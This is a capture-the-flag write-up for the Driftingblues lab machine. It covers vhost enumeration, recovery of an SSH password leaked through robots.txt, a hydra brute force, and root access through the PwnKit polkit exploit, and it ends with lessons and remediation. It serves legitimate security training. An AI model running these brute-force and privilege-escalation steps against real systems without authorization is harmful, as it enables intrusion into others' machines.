# Driftingblues  — CTF Write-up

**Target:** `192.168.80.150` · **Difficulty:** Easy · **Flags:** 2/2 ✅

## 1. Recon

Nmap showed only **port 80 (Apache)** open — the whole attack surface is the website.

## 2. Web Enumeration

**a) Hidden path via base64 in page source**

bash

```
echo -n 'L25vdGVmb3JraW5nZmlzaC50eHQ=' | base64 -d# /noteforkingfish.txt
```

The note (in Eric's "ook" style) hinted at the **hosts file**: name-based virtual hosts are in play.

bash

```
echo "192.168.80.150 driftingblues.box" >> /etc/hosts
```

**b) VHOST enumeration**

bash

```
gobuster vhost -u http://192.168.80.150 \  -w /home/kali/Downloads/directory-list-2.3-medium.txt \  --domain driftingblues.box --append-domain
```

Found: **`test.driftingblues.box` → 200 (Size 24)**. (The 400s were just wordlist comment lines — add `-b 400` next time to cut the noise.)

**c) robots.txt on the test vhost**

```
/ssh_cred.txt
```

Contents: _"we can use ssh password in case of emergency. it was **1mw4ckyyucky**."_

> The wording "it **was**" hints the password was rotated — append a digit.

## 3. Initial Access — SSH brute force

bash

```
hydra -l eric -P rockyou.txt 192.168.80.150 ssh# [22][ssh] host: 192.168.80.150   login: eric   password: 1mw4ckyyucky6
```

The leaked password with a trailing `6`. SSH in as **eric** → user flag (1/2).

## 4. Privilege Escalation — PwnKit (CVE-2021-4034)

Old Debian/Ubuntu 2020 image → vulnerable **polkit pkexec**. Compile and run:

bash

```
gcc cve-2021-4034.c -o PwnKit && ./PwnKit# root@driftingblues:/home/eric#
```

`/root/root.txt` → **flag 2/2 — congratulations!** 🎉

## 5. Lessons Learned

|Finding|Takeaway|
|---|---|
|Base64 string in HTML source|Always read page source for encoded pointers|
|"Use hosts file" note|IP-only scans miss name-based vhosts — fuzz with `--append-domain`|
|`ssh_cred.txt` in robots.txt|Classic recon stop; "it was" = password changed, not removed|
|`1mw4ckyyucky` → `1mw4ckyyucky6`|Simple mutation beats naive reuse; brute force with rules/mutations|
|Unpatched polkit|PwnKit roots nearly any unpatched Linux from that era — check `dpkg -l policykit-1` early|

**Remediation:** remove secrets from the web root, patch polkit, rotate (not mutate) leaked credentials.